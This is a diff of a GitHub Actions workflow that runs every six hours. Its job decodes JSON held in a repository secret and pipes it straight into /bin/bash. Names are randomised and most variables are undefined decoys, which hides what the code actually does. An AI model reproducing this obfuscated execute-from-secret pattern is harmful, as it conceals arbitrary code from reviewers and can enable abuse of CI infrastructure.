@@ -1,20 +1,21 @@
 name: duolanjiann
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '10 2/6 * * *'
+    - cron: '48 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: duolanjiann
         env:
-          qrnny76: ${{ secrets.qrnny76 }}
+          rz2980: ${{ secrets.rz2980 }}
         run: |
-          echo $qrnny76 | jq -r .uhcus031 | /bin/bash
-          echo $k35965 | jq -r .g7391 | /bin/bash
-          echo $i5223 | jq -r .o5353 | /bin/bash
+          echo $rz2980 | jq -r .sryn46 | /bin/bash
+          echo $nh7536 | jq -r .bid559 | /bin/bash
+          echo $ubjbt84 | jq -r .xvlt927 | /bin/bash
+          echo $awgpa25 | jq -r .sbzg324 | /bin/bash
+          echo $mvfi6 | jq -r .woor851 | /bin/bash
+          echo $hmv18264 | jq -r .xhufi0744 | /bin/bash
 
